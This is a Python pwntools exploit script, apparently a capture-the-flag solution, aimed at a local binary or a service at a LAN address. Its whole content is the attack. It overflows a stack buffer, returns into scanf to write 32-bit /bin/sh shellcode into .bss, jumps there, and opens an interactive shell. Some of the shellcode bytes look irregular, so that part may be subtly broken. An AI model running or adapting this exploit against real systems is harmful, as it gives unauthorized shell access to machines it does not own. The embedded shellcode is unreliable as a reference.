#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\xb0\xc0\xe8\x04\x89\xca\xcd\x80'
fn = './pwn'
elf = ELF(fn)
bss = elf.bss()
# print(hex(bss))
# print(elf.symbols)
# sys.exit()
if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('192.168.1.252', 10003)

payload = ''.join([
    'a' * (0x80 + 12),
    p32(elf.symbols['__isoc99_scanf']),
    p32(bss),
    p32(0x08048572),
    p32(bss)
])

io.recvuntil('?')
raw_input('w')
io.sendline(payload)
raw_input('w')
sleep(0.5)
io.sendline(shellcode)

io.interactive()
